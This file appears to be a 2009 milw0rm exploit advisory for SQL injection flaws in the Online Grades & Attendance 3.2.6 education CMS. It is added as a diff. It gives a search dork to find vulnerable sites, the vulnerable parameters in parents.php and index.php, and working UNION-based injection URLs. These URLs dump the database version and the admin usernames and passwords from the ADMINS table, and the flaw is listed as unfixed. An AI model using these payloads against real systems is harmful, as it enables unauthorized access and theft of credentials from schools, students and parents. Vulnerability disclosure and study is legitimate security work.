@@ -1,0 +1,121 @@
+***********************************************************************************************
+***********************************************************************************************
+**	       										     **
+**  											     **
+**     [] [] []  [][][][>  []     []  [][  ][]     []   [][]]  []  [>  [][][][>  [][][][]    **
+**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
+** [>  [][][][]  [][][][>  [] []  []   []  []   [][]  []       [][]    [][][][>  []    []    **
+**  [-----[]-----[][][][>--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][>--[][][][]---\ 
+**==[>    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  >>--
+**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
+   [>   [[[]]]   [][][][>  [][]   [] [][[] [[]]  [][]  [][][]  []  [>  [][][][> <][]   []    **
+**							                                     **
+**    											     **
+**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
+**					¡PROUD TO BE SPANISH!				     **
+**											     **
+***********************************************************************************************
+***********************************************************************************************
+
+----------------------------------------------------------------------------------------------
+|       	   	     MULTIPLE SQL INJECTION VULNERABILITIES	             	     |
+|--------------------------------------------------------------------------------------------|
+|                           |    Online Grades & Attendance v-3.2.6   |		    	     |
+|  CMS INFORMATION:          -----------------------------------------	               	     |
+|										             |
+|-->WEB: http://www.onlinegrades.org/			          			     |
+|-->DOWNLOAD: http://www.onlinegrades.org/		                  		     |
+|-->DEMO: http://www.onlinegrades.org/demo_info						     |
+|-->CATEGORY: CMS / Education								     |
+|-->DESCRIPTION: Online Grades is based on the project, Basmati. It has all of the same      |
+|		features plus many new features. OG is a web based grade...		     |
+|-->RELEASED: 2009-02-05								     |
+|											     |
+|  CMS VULNERABILITY:									     |
+|											     |
+|-->TESTED ON: firefox 3						                     |
+|-->DORK: "Powered by Online Grades"						             |
+|-->CATEGORY: SQL INJECTION							             |
+|-->AFFECT VERSION: <= 3.2.6						 		     |
+|-->Discovered Bug date: 2009-05-21							     |
+|-->Reported Bug date: 2009-05-21							     |
+|-->Fixed bug date: Not fixed								     |
+|-->Info patch: Not fixed							             |
+|-->Author: YEnH4ckEr									     |
+|-->mail: y3nh4ck3r[at]gmail[dot]com							     |
+|-->WEB/BLOG: N/A									     |
+|-->COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.       |
+|-->EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)			     |
+----------------------------------------------------------------------------------------------
+
+
+#########################
+////////////////////////
+
+SQL INJECTION (SQLi):
+
+////////////////////////
+#########################
+
+
+-------------------
+PROOFS OF CONCEPT:
+-------------------
+
+
+<<<<---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++--------->>>>
+
+<<<<---------++++++++ Condition: Be a registered user: Parent, Student or faculty ++++++++++--------->>>>
+
+
+[++] GET var --> 'ADD'
+
+[++] File vuln --> 'parents.php'
+
+
+~~~> http://[HOST]/[PATH]/parents/parents.php?func=mailto&ADD=-1%27+UNION+ALL+SELECT+user()%23
+
+
+<<<<---------++++++++++++++ Condition: magic quotes=OFF +++++++++++++++++--------->>>>
+
+
+[++] GET var --> 'key'
+
+[++] File vuln --> 'index.php'
+
+
+~~~> http://[HOST]/[PATH]/?action=resetpass&key=-1%27+UNION+ALL+SELECT+1,version(),3,4,5,6,7,8,9,10,11%23
+
+
+[++[Return]++] ~~~~~> user or version in DB.
+
+
+----------
+EXPLOITS:
+----------
+
+
+~~~> http://[HOST]/[PATH]/parents/parents.php?func=mailto&ADD=-1%27+UNION+ALL+SELECT+concat(client_id,0x3A3A3A,client_pw)+FROM+ADMINS+WHERE+id=%271
+
+~~~> http://[HOST]/[PATH]/?action=resetpass&key=-1%27+UNION+ALL+SELECT+1,concat(client_id,0x3A3A3A,client_pw),3,4,5,6,7,8,9,10,11+FROM+ADMINS+WHERE+id=1%23
+
+
+[++[Return]++] ~~~~~> client_id:::client_pw in 'ADMINS' table
+
+
+<<<-----------------------------EOF---------------------------------->>>ENJOY IT!
+
+
+##############################################################################
+##############################################################################
+##**************************************************************************##
+##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
+##**************************************************************************##
+##--------------------------------------------------------------------------##
+##**************************************************************************##
+## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
+##**************************************************************************##
+##############################################################################
+##############################################################################
+
+# milw0rm.com [2009-06-01]
